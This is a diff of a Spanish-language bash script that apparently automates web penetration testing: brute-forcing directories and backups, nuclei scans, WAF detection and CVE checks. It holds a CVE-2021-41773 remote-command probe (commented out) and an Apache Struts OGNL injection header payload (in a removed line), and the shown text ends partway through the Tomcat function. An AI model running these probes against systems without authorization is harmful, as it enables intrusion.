@@ -1,5 +1,5 @@
 #!/bin/bash
-
+#FIX  clone site cuando se revisa servicios/web.txt valor $DOMINIO parece incorrecto
 OKBLUE='\033[94m'
 THREADS="30"
 OKRED='\033[91m'
@@ -84,6 +84,10 @@ Options:
 --proxychains: s/n
 --hosting: s/n
 --extratest: oscp
+	*aspx/php file bruteforce 
+	*web crawling 
+	*sqli 
+	*xss
 --internet s/n
 	* slowloris
 	* waf detection
@@ -100,6 +104,7 @@ exit
 fi
 
 if [ ! -d ".vulnerabilidades" ]; then #si no existe la carpeta vulnerabilidades es un nuevo escaneo
+	echo "creando carpetas"
 	mkdir .enumeracion
 	mkdir .enumeracion2 
 	mkdir .banners
@@ -107,22 +112,25 @@ if [ ! -d ".vulnerabilidades" ]; then #si no existe la carpeta vulnerabilidades 
 	mkdir .vulnerabilidades	
 	mkdir .vulnerabilidades2 	
 	mkdir reportes	
+	mkdir -p webClone/ 2>/dev/null
 	mkdir -p logs/enumeracion
 	mkdir -p logs/vulnerabilidades	
     mkdir responder
 	mkdir servicios
 	cp /usr/share/lanscanner/.resultados.db .
+else
+	echo "no crear carp"
 fi	
 
 # si escaneamos una sola app https://prueba.com.bo | http://192.168.1.2:8080
 if [ -z $TARGETS ] ; then
 	#cat $TARGETS | cut -d ":" -f1 | sort | uniq > hosts-lives.txt
 	#IP_LIST_FILE="hosts-lives.txt"
-	http_proto=`echo $URL|cut -d ':' -f1`
+	http_proto_http=`echo $URL|cut -d ':' -f1`
 	host=`echo $URL|cut -d ':' -f2| tr -d '/'`
 	port=`echo $URL|cut -d ':' -f3`
 	if [[ -z $port ]]; then
-		if [[  ${http_proto} == *"https"* ]]; then
+		if [[  ${http_proto_http} == *"https"* ]]; then
 			port="443"
 		else
 			port="80"
@@ -134,16 +142,16 @@ if [ -z $TARGETS ] ; then
 	# --url http://192.168.1.2:8080
 	if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
 		ip=$host
-		echo "$ip:$port:$http_proto" >> servicios/web-app-tmp.txt
+		echo "$ip:$port:$http_proto_http" >> servicios/web-app-tmp.txt
 	else # --url https://prueba.com.bo
 		DOMINIO=$host
 		echo "DOMINIO $DOMINIO"
-		echo "$DOMINIO:$port:$http_proto" >> servicios/web-app-tmp.txt
+		echo "$DOMINIO:$port:$http_proto_http" >> servicios/web-app-tmp.txt
 
 		# for ip in $(dig +short $DOMINIO); do
 		# 	#verificar si el sitio es solo accesible mediante dominio
-		# 	peticion_dominio=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto://$DOMINIO/ | wc -c` #bytes
-		# 	peticion_ip=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto://$ip/ | wc -c` #bytes
+		# 	peticion_dominio=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto_http://$DOMINIO/ | wc -c` #bytes
+		# 	peticion_ip=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto_http://$ip/ | wc -c` #bytes
 
 		# 	# Calcular la resta absoluta de peticion_ip y peticion_dominio
 		# 	diff=$(echo ${peticion_dominio}-${peticion_ip} | bc)
@@ -154,7 +162,7 @@ if [ -z $TARGETS ] ; then
 
 		# 	# Comprobar si la diferencia absoluta es menor que el 2% son el mismo sitio
 		# 	if (( $(echo "${abs_diff} < ${two_percent}" | bc -l) )); then				
-		# 		echo "$ip:$port:$http_proto" >> servicios/web-app-tmp.txt
+		# 		echo "$ip:$port:$http_proto_http" >> servicios/web-app-tmp.txt
 		# 	else
 		# 		echo "El sitio no es accesible por IP"
 				
@@ -166,7 +174,7 @@ if [ -z $TARGETS ] ; then
 	IP_LIST_FILE="servicios/hosts.txt"
 fi
 
-echo "URL:$URL TARGETS:$TARGETS MODE:$MODE DOMINIO:$DOMINIO PROXYCHAINS:$PROXYCHAINS IP_LIST_FILE:$IP_LIST_FILE HOSTING:$HOSTING INTERNET:$INTERNET VERBOSE:$VERBOSE"
+echo "URL:$URL TARGETS:$TARGETS MODE:$MODE DOMINIO:$DOMINIO PROXYCHAINS:$PROXYCHAINS IP_LIST_FILE:$IP_LIST_FILE HOSTING:$HOSTING INTERNET:$INTERNET VERBOSE:$VERBOSE EXTRATEST:$EXTRATEST" 
 
 function insert_data () {
 	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
@@ -212,7 +220,7 @@ function formato_ip {
 function waitFinish (){
 	################# Comprobar que no haya scripts ejecutandose ########
 	while true; do	
-		script_instancias=$((`ps aux | egrep 'webData|get_ssl_cert|web-buster|httpmethods.py|msfconsole|nmap|droopescan|CVE-2019-19781.sh|nuclei|owa.pl|curl|firepower.pl|wampServer.pl|medusa|JoomlaJCKeditor.py|joomla-' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1))			
+		script_instancias=$((`ps aux | egrep 'webData|get_ssl_cert|web-buster|httpmethods.py|msfconsole|nmap|droopescan|CVE-2019-19781.sh|nuclei|owa.pl|curl|firepower.pl|wampServer.pl|medusa|JoomlaJCKeditor.py|joomla-|testssl.sh' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1))			
 		echo -e "\tscript_instancias ($script_instancias)"
 		if [[ $script_instancias -gt 0  ]];then 
 			echo -e "\t[-] Aun hay instancias de nmap en segundo plano activas"
@@ -242,10 +250,10 @@ function waitWeb (){
 }
 
 function enumeracionDefecto () {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3     
-   echo -e "\t[+] Default enumeration ($proto : $host : $port)"
+   echo -e "\t[+] Default enumeration ($proto_http : $host : $port)"
    waitWeb 2.5
     egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" .enumeracion/"$host"_"$port"_webData.txt 
 	greprc=$?
@@ -258,56 +266,56 @@ function enumeracionDefecto () {
 			if [[ $greprc -eq 1 ]]; then	
 				waitWeb 2.5
 				echo -e "\t\t[+] Revisando folders ($host - default)"						
-				$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &
+				$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &
 			fi
 						
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
-			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
+			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
 
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
-			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &	
+			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &	
 		fi  
 		
 		#waitWeb 2.5
 		#echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"		
-		#$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt &				
+		#$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webadmin.txt &				
 
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
-		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
+		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto_http -q 1 $param_msg_error > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
 
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
-    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
+    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
 
 	fi		
 }
 
 function enumeracionSharePoint () {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3     
-   echo -e "\t[+] Enumerar Sharepoint ($proto : $host : $port)"	
+   echo -e "\t[+] Enumerar Sharepoint ($proto_http : $host : $port)"	
 
 		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then 			
 			echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"					
 			waitWeb 2.5
-			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -e 'something went wrong' -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &								
+			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto_http -e 'something went wrong' -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &								
 		fi	
 
 	waitWeb 2.5
     echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
-    echo "web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -q 1 -e \'something went wrong\'" > logs/enumeracion/"$host"_"$port"_SharePoint.txt  
-	$proxychains web-buster.pl  -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -e 'something went wrong' -q 1 >> logs/enumeracion/"$host"_"$port"_SharePoint.txt  &   
+    echo "web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto_http -q 1 $param_msg_error-e \'something went wrong\'" > logs/enumeracion/"$host"_"$port"_SharePoint.txt  
+	$proxychains web-buster.pl  -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto_http -e 'something went wrong' -q 1 >> logs/enumeracion/"$host"_"$port"_SharePoint.txt  &   
 }
 
 function enumeracionIIS () {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3     
-   echo -e "\t[+] Enumerar IIS ($proto : $host : $port)"	
+   echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port)"	
 	
     egrep -iq "IIS/6.0|IIS/5.1" .enumeracion/"$host"_"$port"_webData.txt
     IIS6=$?
@@ -318,23 +326,23 @@ function enumeracionIIS () {
     fi
    
     echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt &	
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webadmin.txt &	
     
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
 
 	waitWeb 2.5
    	echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
 
 	waitWeb 2.5				
 	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webserver.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webservices -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webservices.txt &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webservices -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webservices.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] certsrv ($host - IIS)"
@@ -349,13 +357,13 @@ function enumeracionIIS () {
 			if [[ $greprc -eq 1 ]]; then	
 				echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"
 				waitWeb 2.5
-				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
+				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
 			fi			
 		fi
 
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
-		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &
+		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &
 		
 		echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
 		echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
@@ -363,11 +371,11 @@ function enumeracionIIS () {
 								
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"								
-		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorIIS -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
+		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorIIS -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
 		
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
-		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &
+		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &
 		
 
 		if [  "$EXTRATEST" == "oscp" ]; then	
@@ -379,7 +387,7 @@ function enumeracionIIS () {
 			else
 				waitWeb 2.5
 				echo -e "\t\t[+] Revisando archivos aspx ($host - IIS)"
-				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m aspx -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_aspx-files.txt &
+				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m aspx -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_aspx-files.txt &
 			fi		
 		fi
 		
@@ -391,47 +399,51 @@ function enumeracionIIS () {
 
 
 function enumeracionApache () {  
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3  
-   echo -e "\t[+] Enumerar Apache ($proto : $host : $port)"	 
+   echo -e "\t[+] Enumerar Apache ($proto_http : $host : $port)"	 
 
 	waitWeb 2.5
    echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"	
-   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/apache.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt &
+   nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/apache.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_apacheNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_apacheNuclei.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
-	echo "$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1"  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
-	$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webadmin.txt &
+	echo "$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto_http -q 1 $param_msg_error"  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
+	$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webadmin.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto_http -q 1 $param_msg_error > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
     
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
 
   	waitWeb 2.5
    	echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
 	
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
-	web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &
+	web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m webserver -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webserver.txt &
 
 	waitWeb 2.5	
 	echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($host - Apache/nginx)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m registroHabilitado -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m registroHabilitado -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt &
 	
     #  CVE-2021-4177								
     echo -e "\t\t[+] Revisando apache traversal)" 
     $proxychains apache-traversal.py  --target  $host --port $port > logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt &
 
+	echo -e "\t[+] multiviews check ($proto_http://$host:$port)  " 
+	multiviews -url=$proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 
+	grep vulnerable logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt > .vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 
+
 	# cve-2021-41773
 	#echo -e "\t\t[+] Revisando cve-2021-41773 (RCE)" 
-	#$proxychains curl -k --max-time 10 $proto://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id' > logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null &
+	#$proxychains curl -k --max-time 10 $proto_http://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id' > logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null &
 	
 
 	if [[  "$MODE" == "total" ]]; then
@@ -443,17 +455,17 @@ function enumeracionApache () {
 			if [[ $greprc -eq 1 ]]; then	
 				waitWeb 2.5
 				echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
-				web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
+				web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m folders -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
 				sleep 1	
 			fi					
 
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
-			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &			
+			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &			
 
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando archivos graphQL ($host - Apache/nginx)"
-	    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m graphQL -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_graphQL.txt &
+	    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m graphQL -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_graphQL.txt &
 
 			if [ "$EXTRATEST" == "oscp" ]; then	
 				egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
@@ -463,7 +475,7 @@ function enumeracionApache () {
 				else
 					waitWeb 2.5
 					echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
-					web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_php-files.txt &
+					web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m php -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_php-files.txt &
 				fi
 			fi
 		fi	
@@ -471,11 +483,11 @@ function enumeracionApache () {
 
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
-		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupApache -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &		
+		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupApache -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &		
   				
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
-		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorApache -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
+		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorApache -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
 								
 	fi  
     
@@ -492,7 +504,7 @@ function enumeracionApache () {
 	if [ "$INTERNET" == "n" ]; then 
 		waitWeb 2.5
 		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
-		web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &
+		web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &
 		
 	else
 		grep "is behind" logs/enumeracion/"$host"_"$port"_wafw00f.txt > .enumeracion/"$host"_"$port"_wafw00f.txt 2>/dev/null
@@ -501,68 +513,52 @@ function enumeracionApache () {
 		if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
-			web-buster.pl  -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &       								
+			web-buster.pl  -t $host -p $port -h $hilos_web -d / -m cgi -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &       								
 		fi	
 	fi
-	
-
-	# grep -qi "strapi" .enumeracion/"$host"_"$port"_webData.txt
-	# greprc=$?
-	# if [[ $greprc -eq 0 ]];then # si hay no hay firewall protegiendo la app								
-	# 	waitWeb 2.5
-	# 	echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
-	# 	web-buster.pl  -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &       								
-	# else
-	# 	echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
-	# 	echo "$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1"  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
-	# 	$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webadmin.txt &
-	# fi	
-
-	#echo -e "\t\t[+] Revisando docker socks ($host - Apache/nginx)"
-	#curl -XGET --unix-socket /var/run/docker.sock $proto://$host:$port/images/json > logs/vulnerabilidades/"$host"_docker_images.txt
-	#grep "Containers" logs/vulnerabilidades/"$host"_docker_images.txt > .vulnerabilidades/"$host"_docker_images.txt
+		
 }
 
 
 function enumeracionTomcat () {  
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3  
-   echo -e "\t\t[+] Enumerar Tomcat ($proto : $host : $port)"   
+   echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"   
 
-   $proxychains curl --max-time 10 "$proto":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt &   
-   $proxychains curl --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto://$host:$port')).(#ros.flush())}" "$proto://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null&
+   $proxychains curl --max-time 10 "$proto_http":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt &   
